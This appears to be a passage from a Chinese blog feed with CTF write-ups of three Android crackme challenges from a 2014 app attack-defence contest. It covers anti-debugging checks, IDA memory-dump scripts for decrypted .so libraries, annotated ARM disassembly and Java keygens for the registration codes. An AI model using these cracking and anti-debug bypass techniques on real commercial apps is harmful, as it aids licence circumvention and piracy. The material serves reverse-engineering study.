&lt;p&gt;&lt;img src=&quot;/assets/resources/6A198B5C3CC47FAD8A85A9FA7F9ED05E.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所有子线程的函数参数全是内存地址，有两种方法，第一种是动态调试，但是需要过掉反调试，第二种方法，可以看到我在上面的截图里已经体现出来了，so加载到内存里的地址一般都是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x*****000&lt;/code&gt;，所以我们可以根据地址的后三位来搜索函数，而且IDA识别函数后会将函数命名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_****&lt;/code&gt;，而且有地址的偏移等信息&lt;/p&gt;

&lt;p&gt;那么我们来一个个找&lt;/p&gt;

&lt;p&gt;第一个函数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Z13debuggdb_scanv&lt;/code&gt;，实现了循环检测&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DA3C85C3EEC9E256AC9BD419BBAB91BF.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟进其中调用的函数，检测的是进程名，分别检测了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdbserver&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;android_server&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xposed&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/517640C44ADDC20E9D15FB2BAA5699C8.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第二个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Z26file_pro_thread_strengthenv&lt;/code&gt;，这个函数我不知道是什么反调试操作，比较猥琐的感觉&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A131DF4ECE6D399B1DD952EFDA482F41.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先放着，我找其他师傅再问问&lt;/p&gt;

&lt;p&gt;第三个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Z18prevent_attach_onev&lt;/code&gt;，看起来好像是调用了上了锁的函数的样子&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/68D249F50E4510F32EA56ABDC75F09A5.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个函数读取了进程的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/%d/task/%s/stat&lt;/code&gt;文件夹&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BB4DB84C4581D49C104DD1E556C2D6B2.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;判断了标志位&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/078D0174288A3D22C463E53A0EF6263E.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第四个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_Z18prevent_attach_twov&lt;/code&gt;好像也是调用了上了锁的函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6442363E81D8A1B9F39752CF1C984C8B.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;反调试部分大概就是这样&lt;/p&gt;

&lt;p&gt;接下来我们来看校验部分&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C0071816F849A5155C831835422527E6.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;进入校验，先初始化内存空间存储用户名和注册码，然后进入校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CF11BBEC596863034A112C03AE1FE063.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;三处&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;判断，然后进入校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C9B3040DB4F3231178ADAD698836CD7F.png&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;变量的初始化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7FB63E6397C75B3F256C9E8D7FC0C024.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将解码后的数据前&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n - 2&lt;/code&gt;位进行奇数位和偶数位的交换&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/13127DAB8935D51FBB3EC5E0329FA4D4.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后正常对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B1466BD6D40C44B5C5B28246AB71F4C0.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后测试&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3A52AFF2D112F191D2D62383F68A461F.png&quot; alt=&quot;19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;注册代码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class MyKeyGen {
    public static void main(String[] args) throws Exception {
        String userName = &quot;wnagzihxain&quot;;
        StringBuilder re_userName = new StringBuilder();
        for (int i = 0; i &amp;lt; userName.length() - 2; i += 2) {
            re_userName.append(userName.charAt(i + 1));
            re_userName.append(userName.charAt(i));
        }
        re_userName.append(userName.charAt(userName.length() - 1));
//        System.out.println(re_userName.toString());
        StringBuilder temp = new StringBuilder(Base64.getBase64(re_userName.toString()));
        System.out.println(temp);
        StringBuilder regCode = new StringBuilder();
        for (int i = 0; i &amp;lt; temp.length(); i++) {
            regCode.append(temp.charAt(i));
            if (temp.charAt(i + 1) == '=') {
                break;
            }
            if ((i + 1) % 3 == 0) {
                regCode.append('-');
            }
        }
        System.out.println(regCode);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
                <pubDate>Thu, 07 Sep 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/09/07/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l3.sign.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/09/07/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l3.sign.html</guid>
            </item>
        
            <item>
                <title>2014 NAGA&PIOWIND APP应用攻防竞赛 - crackme.l2.sign</title>
                <description>&lt;p&gt;Java层加了不知道是什么的花指令&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BCB886053837B79B24414D5BA903FE9A.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其实认真看一下大概还是能看出来的，我闲着无聊给处理了一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.crackme;

import android.app.Activity;
import android.os.Bundle;
import android.text.Editable;
import android.view.View$OnClickListener;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import java.io.PrintStream;

public class MainActivity extends Activity {
    private Button btn_login;
    private Button btn_reset;
    public static MainActivity m_lpThisBen;
    private EditText txt_name;
    private EditText txt_passwd;
    private TextView txt_result;

    static {
        String v0 = &quot;crackme&quot;;
        System.loadLibrary(v0);
    }

    public MainActivity() {
        super();
    }

    static EditText access$0(MainActivity arg2) {
        EditText v0 = arg2.txt_name;
        return v0;
    }

    static EditText access$1(MainActivity arg2) {
        EditText v0 = arg2.txt_passwd;
        return v0;
    }

    static TextView access$2(MainActivity arg2) {
        TextView v0 = arg2.txt_result;
        return v0;
    }

    static String access$3(MainActivity arg2, String arg3, String arg4) {
        String v0 = arg2.crackme(arg3, arg4);
        return v0;
    }

    private native String crackme(String arg1, String arg2) {
    }

    protected void onCreate(Bundle arg4) {
        super.onCreate(arg4);
        int v0 = 2130903040;
        this.setContentView(v0);
        v0 = 2131165184;
        View v0_1 = this.findViewById(v0);
        this.txt_name = ((EditText)v0_1);
        v0 = 2131165185;
        v0_1 = this.findViewById(v0);
        this.txt_passwd = ((EditText)v0_1);
        v0 = 2131165186;
        v0_1 = this.findViewById(v0);
        this.btn_login = ((Button)v0_1);
        v0 = 2131165187;
        v0_1 = this.findViewById(v0);
        this.btn_reset = ((Button)v0_1);
        v0 = 2131165188;
        v0_1 = this.findViewById(v0);
        this.txt_result = ((TextView)v0_1);
        Button v0_2 = this.btn_login;
        com.crackme.MainActivity$1 v1 = new View$OnClickListener() {
            public void onClick(View arg8) {
                TextView v3_6;
                String v4;
                PrintStream v3_5;
                MainActivity v3 = MainActivity.this;
                EditText v3_1 = MainActivity.access$0(v3);
                Editable v3_2 = v3_1.getText();
                String v0 = v3_2.toString();
                v3 = MainActivity.this;
                v3_1 = MainActivity.access$1(v3);
                v3_2 = v3_1.getText();
                String v1 = v3_2.toString();
                String v3_3 = &quot;&quot;;
                boolean v3_4 = v3_3.equals(v0);
                if(v3_4) {
                    v3_5 = System.out;
                    v4 = &quot;name is null or \'\'&quot;;
                    v3_5.println(v4);
                    v3 = MainActivity.this;
                    v3_6 = MainActivity.access$2(v3);
                    v4 = &quot;账户为空&quot;;
                    v3_6.setText(((CharSequence)v4));
                }
                else {
                    v3_3 = &quot;&quot;;
                    v3_4 = v3_3.equals(v1);
                    if(v3_4) {
                        v3_5 = System.out;
                        v4 = &quot;passwd is null or \'\'&quot;;
                        v3_5.println(v4);
                        v3 = MainActivity.this;
                        v3_6 = MainActivity.access$2(v3);
                        v4 = &quot;密码为空&quot;;
                        v3_6.setText(((CharSequence)v4));
                        while(true) {
                            if(98 &amp;gt;= 0) {
                                goto label_152;
                            }
                        }
                    }
                    v3_5 = System.out;
                    String v5 = &quot;name:&quot;;
                    StringBuilder v4_1 = new StringBuilder(v5);
                    v4_1 = v4_1.append(v0);
                    v4 = v4_1.toString();
                    v3_5.println(v4);
                    v3_5 = System.out;
                    v5 = &quot;passwd:&quot;;
                    v4_1 = new StringBuilder(v5);
                    v4_1 = v4_1.append(v1);
                    v4 = v4_1.toString();
                    v3_5.println(v4);
                    v3_5 = System.out;
                    v4 = &quot;Please treat me gently, you have to go a long way.&quot;;
                    v3_5.println(v4);
                    v3 = MainActivity.this;
                    String v2 = MainActivity.access$3(v3, v0, v1);
                    v3 = MainActivity.this;
                    v3_6 = MainActivity.access$2(v3);
                    v3_6.setText(((CharSequence)v2));
                }
            label_152:
            }
        };
        v0_2.setOnClickListener(((View$OnClickListener)v1));
        v0_2 = this.btn_reset;
        com.crackme.MainActivity$2 v1_1 = new View$OnClickListener() {
            public void onClick(View arg4) {
                MainActivity v0 = MainActivity.this;
                EditText v0_1 = MainActivity.access$0(v0);
                String v1 = &quot;&quot;;
                v0_1.setText(((CharSequence)v1));
                v0 = MainActivity.this;
                v0_1 = MainActivity.access$1(v0);
                v1 = &quot;&quot;;
                v0_1.setText(((CharSequence)v1));
                v0 = MainActivity.this;
                TextView v0_2 = MainActivity.access$2(v0);
                v1 = &quot;&quot;;
                v0_2.setText(((CharSequence)v1));
            }
        };
        v0_2.setOnClickListener(((View$OnClickListener)v1_1));
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;和第一题大概是一样的，再看so文件，同样加密了，使用第一题的方法动态调试&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/11ABC6564768786413B34E4C6A83094A.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;撸回本地&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto fp, dex_addr, end_addr;  
fp = fopen(&quot;E:\\libcrackme.so&quot;, &quot;wb&quot;);  
for(dex_addr = 0xA350E000; dex_addr &amp;lt; 0xA355B000; dex_addr++)
    fputc(Byte(dex_addr), fp);  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是我们使用IDA打开的时候，发现出错，使用010editor分析，发现文件头没了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F03289BB06EFE7C80CDEA1F15DDA38E4.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们找个正常的so文件的文件头拷贝回去，然后再使用IDA打开，发现可以打开了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/77E31D24DC3112EDAFD57FA7BD5A328D.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们继续分析，整个程序的结构和第一题是一样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D8AA6E13486FFD5A6EB0D608024AEBB1.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;新建内存空间&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A0AF8001ACEDE1E989C48943B79A3E98.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Base64解码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/35A24BDE8E99B1D38C7F04FE474EA370.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是我们在最后校验的地方发现了不一样的地方，它校验的方式是反过来的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/01C5B5B15959A43CEA08B30D6C245773.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;突然界面就酷炫了起来&lt;/p&gt;

&lt;p&gt;那么就比较简单了，注册码就是用户名倒序的Base64编码再插入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/289FCBD69F333B604F8A047F73DDF77F.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;注册算法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class MyKeyGen {
    public static void main(String[] args) throws Exception {
        String userName = &quot;wnagzihxain&quot;;
        StringBuilder re_userName = new StringBuilder(userName).reverse();
        StringBuilder temp = new StringBuilder(Base64.getBase64(re_userName.toString()));
        System.out.println(temp);
        StringBuilder regCode = new StringBuilder();
        for (int i = 0; i &amp;lt; temp.length(); i++) {
            regCode.append(temp.charAt(i));
            if (temp.charAt(i + 1) == '=') {
                break;
            }
            if ((i + 1) % 3 == 0) {
                regCode.append('-');
            }
        }
        System.out.println(regCode);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
                <pubDate>Tue, 05 Sep 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/09/05/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l2.sign.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/09/05/2014-NAGA&PIOWIND-APP%E5%BA%94%E7%94%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B-crackme.l2.sign.html</guid>
            </item>
        
            <item>
                <title>2014 NAGA&PIOWIND APP应用攻防竞赛 - crackme.l1.sign</title>
                <description>&lt;p&gt;Java层用于传字符串，输入用户名和密码到Native层校验&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;protected void onCreate(Bundle arg3) {
    super.onCreate(arg3);
    this.setContentView(2130903040);
    this.txt_name = this.findViewById(2131165184);
    this.txt_passwd = this.findViewById(2131165185);
    this.btn_login = this.findViewById(2131165186);
    this.btn_reset = this.findViewById(2131165187);
    this.txt_result = this.findViewById(2131165188);
    this.btn_login.setOnClickListener(new View$OnClickListener() {
        public void onClick(View arg7) {
            String v0 = MainActivity.this.txt_name.getText().toString();
            String v1 = MainActivity.this.txt_passwd.getText().toString();
            if(&quot;&quot;.equals(v0)) {
                System.out.println(&quot;name is null or \'\'&quot;);
                MainActivity.this.txt_result.setText(&quot;账户为空&quot;);
            }
            else if(&quot;&quot;.equals(v1)) {
                System.out.println(&quot;passwd is null or \'\'&quot;);
                MainActivity.this.txt_result.setText(&quot;密码为空&quot;);
            }
            else {
                System.out.println(&quot;name:&quot; + v0);
                System.out.println(&quot;passwd:&quot; + v1);
                System.out.println(&quot;Please treat me gently, you have to go a long way.&quot;);
                MainActivity.this.txt_result.setText(MainActivity.this.crackme(v0, v1));
            }
        }
    });
    this.btn_reset.setOnClickListener(new View$OnClickListener() {
        public void onClick(View arg3) {
            MainActivity.this.txt_name.setText(&quot;&quot;);
            MainActivity.this.txt_passwd.setText(&quot;&quot;);
            MainActivity.this.txt_result.setText(&quot;&quot;);
        }
    });
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用IDA查看so，发现加密了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3B361C16757CB1D4AE1D1E4DFAC52CAD.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;动态调试把解密后的so文件dump出来&lt;/p&gt;

&lt;p&gt;先查看加载的内存基址&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1C53E94C712BCA058FFF30D365ABFAC0.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;dump脚本如下，地址需要根据自己的调试环境确定&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto fp, dex_addr, end_addr;  
fp = fopen(&quot;E:\\libcrackme.so&quot;, &quot;wb&quot;);  
for(dex_addr = 0xA35C8000; dex_addr &amp;lt; 0xA3609000; dex_addr++)  
    fputc(Byte(dex_addr), fp);  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后再打开，可以看到代码已经还原了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/52D577FF8DAF95AE4666CE27A696E47D.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先传入用户名和密码，然后转为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *&lt;/code&gt;类型的字符串，，接着调用两个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_536C()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_597C()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005B50             ; jstring __fastcall Java_com_crackme_MainActivity_crackme(JNIEnv *env, int a2, jstring a3, jstring a4)
LOAD:00005B50             EXPORT Java_com_crackme_MainActivity_crackme
LOAD:00005B50             Java_com_crackme_MainActivity_crackme
LOAD:00005B50 F8 B5       PUSH            {R3-R7,LR}
LOAD:00005B52             ; 7:   v4 = a4;
LOAD:00005B52 1E 1C       MOVS            R6, R3  ; R6 = R3 = password
LOAD:00005B54             ; 9:   v6 = (*env)-&amp;gt;GetStringUTFChars(env, a3, 0);
LOAD:00005B54 03 68       LDR             R3, [R0] ; R3 = [R0] = *env
LOAD:00005B56 A9 25 AD 00 MOVS            R5, #0x2A4 ; R5 = 0x2A4
LOAD:00005B5A 5B 59       LDR             R3, [R3,R5] ; R3 = GetStringUTFChars()
LOAD:00005B5C 11 1C       MOVS            R1, R2  ; R1 = R2 = username
LOAD:00005B5E             ; 8:   vEnv = env;
LOAD:00005B5E 00 22       MOVS            R2, #0  ; R2 = 0
LOAD:00005B60 04 1C       MOVS            R4, R0  ; R4 = R0 = env
LOAD:00005B62 98 47       BLX             R3      ; R0 = (*env)-&amp;gt;GetStringUTFChars(env, username, 0)
LOAD:00005B64 23 68       LDR             R3, [R4] ; R3 = [R4] = *env
LOAD:00005B66 07 1C       MOVS            R7, R0  ; R7 = R0 = szUserName
LOAD:00005B68             ; 10:   v7 = (*vEnv)-&amp;gt;GetStringUTFChars(vEnv, v4, 0);
LOAD:00005B68 31 1C       MOVS            R1, R6  ; R1 = R6 = Password
LOAD:00005B6A 5B 59       LDR             R3, [R3,R5] ; R3 = GetStringUTFChars()
LOAD:00005B6C 20 1C       MOVS            R0, R4  ; R0 = R4 = env
LOAD:00005B6E 00 22       MOVS            R2, #0  ; R2 = 0
LOAD:00005B70 98 47       BLX             R3      ; R0 = (*env)-&amp;gt;GetStringUTFChars(env, password, 0)
LOAD:00005B72             ; 11:   sub_536C(&quot;Failure&quot;, v6, v7);
LOAD:00005B72 09 4D       LDR             R5, =(dword_15220 - 0x5B7C) ; R5 = pFailure - 0x5B7C
LOAD:00005B74 39 1C       MOVS            R1, R7  ; R1 = szUserName
LOAD:00005B76 02 1C       MOVS            R2, R0  ; R2 = R0 = szPassword
LOAD:00005B78 7D 44       ADD             R5, PC ; dword_15220
LOAD:00005B7A 04 35       ADDS            R5, #4  ; R5 = pFailure
LOAD:00005B7C 28 1C       MOVS            R0, R5  ; R0 = R5 = pFailure
LOAD:00005B7E FF F7 F5 FB BL              sub_536C ; R0 = sub_536C(&quot;Failure&quot;, szUserName, szPassword)
LOAD:00005B82             ; 12:   sub_597C((int)&quot;Failure&quot;);
LOAD:00005B82 28 1C       MOVS            R0, R5  ; R0 = R5 = pFailure
LOAD:00005B84 FF F7 FA FE BL              sub_597C ; R0 = sub_597C(pFailure)
LOAD:00005B88             ; 13:   return (*vEnv)-&amp;gt;NewStringUTF(vEnv, &quot;Failure&quot;);
LOAD:00005B88 22 68       LDR             R2, [R4] ; R2 = [R4] = *env
LOAD:00005B8A A7 23 9B 00 MOVS            R3, #0x29C ; R3 = 0x29C
LOAD:00005B8E 29 1C       MOVS            R1, R5  ; R1 = R5 = pFailure
LOAD:00005B90 D3 58       LDR             R3, [R2,R3] ; R3 = NewStringUTF()
LOAD:00005B92 20 1C       MOVS            R0, R4  ; R0 = R4 = env
LOAD:00005B94 98 47       BLX             R3      ; R0 = (*env)-&amp;gt;NewStringUTF(env, &quot;Failure&quot;)
LOAD:00005B96 F8 BD       POP             {R3-R7,PC}
LOAD:00005B96             ; End of function Java_com_crackme_MainActivity_crackm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_536C(&quot;Failure&quot;, szUserName, szPassword)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个函数比较简单&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1B1F75D9C9BBC75CA6EE3B46F2A2FAAB.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先传进来一个字符串指针，这个指针非常重要，后续的栈变量要使用这个字符串指针作为基址来寻找&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0000536C             ; const JNINativeInterface *__fastcall malloc_Heap(int a1, const char *a2, const char *a3)
LOAD:0000536C             malloc_Heap
LOAD:0000536C
LOAD:0000536C             n= -0x24
LOAD:0000536C             len_UserName= -0x20
LOAD:0000536C             len_Password= -0x1C
LOAD:0000536C
LOAD:0000536C F0 B5       PUSH            {R4-R7,LR}
LOAD:0000536E 85 B0       SUB             SP, SP, #0x14 ; 抬高栈顶
LOAD:00005370             ; 15:   v3 = a3;
LOAD:00005370 16 1C       MOVS            R6, R2  ; R6 = R2 = szPassword
LOAD:00005372             ; 16:   v4 = a1;
LOAD:00005372 04 1C       MOVS            R4, R0  ; R4 = R0 = &quot;Failure&quot;
LOAD:00005374             ; 17:   v5 = a2;
LOAD:00005374 0D 1C       MOVS            R5, R1  ; R5 = R1 = szUserName
LOAD:00005376             ; 18:   result = (const JNINativeInterface *)sub_5328(a1);
LOAD:00005376 FF F7 D7 FF BL              sub_5328 ; R0 = sub_5328(pFailure)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_5328()&lt;/code&gt;用于初始化某些栈空间&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3D13D00C1358815F7977ED540E6ADA4A.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后有两处判断，判断传入的两个字符串是否为空&lt;/p&gt;

&lt;p&gt;判断密码是否为空&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0000537A             ; 19:   if ( v3 )
LOAD:0000537A 00 2E       CMP             R6, #0  ; if(szPassword == 0)
LOAD:0000537C 2F D0       BEQ             loc_53DE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;判断用户名是否为空&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0000537E             ; 21:     if ( v5 )
LOAD:0000537E 00 2D       CMP             R5, #0  ; if(szUserName == 0)
LOAD:00005380 2D D0       BEQ             loc_53DE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;申请空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005382             ; 23:       v7 = strlen(v5);
LOAD:00005382 28 1C       MOVS            R0, R5  ; s
LOAD:00005384 FF F7 1C EF BLX             strlen  ; R0 = strlen(szUserName)
LOAD:00005388             ; 24:       len_UserName = v7;
LOAD:00005388 02 90       STR             R0, [SP,#0x28+len_UserName] ; len_UserName = strlen(szUserName)
LOAD:0000538A             ; 25:       v8 = v7;
LOAD:0000538A 07 1C       MOVS            R7, R0  ; R7 = R0 = len_UserName
LOAD:0000538C             ; 26:       v9 = strlen(v3);
LOAD:0000538C 30 1C       MOVS            R0, R6  ; s
LOAD:0000538E FF F7 18 EF BLX             strlen  ; R0 = strlen(szPassword)
LOAD:00005392             ; 27:       v10 = v8 + 1;
LOAD:00005392 01 37       ADDS            R7, #1  ; R7 = len_UserName + 1
LOAD:00005394             ; 28:       v14 = v9;
LOAD:00005394 03 1C       MOVS            R3, R0  ; R3 = R0 = len_Password
LOAD:00005396 01 33       ADDS            R3, #1  ; R3 = len_Password + 1
LOAD:00005398 03 90       STR             R0, [SP,#0x28+len_Password] ; len_Password = R0
LOAD:00005398                                     ; R0 = len_UserName + 1
LOAD:0000539A             ; 30:       *(_DWORD *)(v4 + 52) = operator new[](v10);
LOAD:0000539A 38 1C       MOVS            R0, R7  ; unsigned int
LOAD:0000539C             ; 29:       n = v9 + 1;
LOAD:0000539C 01 93       STR             R3, [SP,#0x28+n] ; n = len_Password + 1
LOAD:0000539E FF F7 16 EF BLX             _Znaj   ; operator new[](len_UserName + 1) // 申请空间
LOAD:000053A2 60 63       STR             R0, [R4,#0x34] ; R0为新UserName存储堆地址
LOAD:000053A4             ; 31:       result = (const JNINativeInterface *)operator new[](n);
LOAD:000053A4 01 98       LDR             R0, [SP,#0x28+n] ; unsigned int
LOAD:000053A6 FF F7 12 EF BLX             _Znaj   ; operator new[](uint)
LOAD:000053AA             ; 32:       v11 = *(void **)(v4 + 52);
LOAD:000053AA 63 6B       LDR             R3, [R4,#0x34] ; R3 = pUserName
LOAD:000053AC             ; 33:       *(_DWORD *)(v4 + 56) = result;
LOAD:000053AC A0 63       STR             R0, [R4,#0x38] ; R0为新Password存储堆地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过返回的内存分配地址来判断是否申请成功&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000053AE             ; 34:       if ( v11 )
LOAD:000053AE 00 2B       CMP             R3, #0  ; 判断UserName内存空间是否申请成功
LOAD:000053B0 15 D0       BEQ             loc_53DE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

